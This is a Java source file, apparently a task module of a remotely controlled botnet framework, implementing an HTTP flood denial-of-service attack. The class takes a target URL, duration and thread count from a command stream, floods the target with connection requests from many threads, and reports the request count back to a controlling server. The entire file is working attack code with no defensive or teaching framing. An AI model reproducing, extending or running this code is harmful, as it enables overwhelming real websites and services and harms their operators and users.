package Server.Tasks.DenialOfService;

import Server.ResponseHandler;
import Server.Task;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicInteger;

public class DenialOfServiceTask extends Task {

  private final String attackAddress;
  private final int howLongInSeconds;
  private final int numberOfThreads;
  private final List<Thread> requestThreadList = new ArrayList<>();
  private final AtomicInteger numRequests = new AtomicInteger(0);

  public DenialOfServiceTask(String attackAddress, int howLongInSeconds, int numberOfThreads) {
    this.attackAddress = attackAddress;
    this.howLongInSeconds = howLongInSeconds;
    this.numberOfThreads = numberOfThreads;
  }

  public static DenialOfServiceTask buildFromScanner(Scanner scanner) {
    String address = scanner.next();
    int howLong = scanner.nextInt();
    int numThreads = scanner.nextInt();

    return new DenialOfServiceTask(address, howLong, numThreads);
  }

  @Override
  public void execute() {
    long endTime = System.currentTimeMillis() + this.howLongInSeconds * 1000;
    for (int x = 0; x < this.numberOfThreads; x++) {
      this.requestThreadList.add(new Thread(() -> {
        while (System.currentTimeMillis() < endTime) {
          try {
            URL myURL = new URL(this.attackAddress);
            URLConnection myURLConnection = myURL.openConnection();
            myURLConnection.connect();
            this.numRequests.incrementAndGet();
          } catch (Exception e) {
            e.printStackTrace();
          }
        }
      }));
    }

    this.requestThreadList.forEach(x -> x.start());

    this.requestThreadList.forEach(x -> {
      try {
        x.join();
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
    });
  }

  @Override
  public void returnResponse(DataOutputStream streamToServer) {
    try {
      streamToServer.writeInt(this.numRequests.get());
      streamToServer.writeUTF(this.attackAddress);
      streamToServer.writeInt(this.howLongInSeconds);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  @Override
  public ResponseHandler getResponseHandler() {
    return new DenialOfServiceResponseHandler();
  }

}
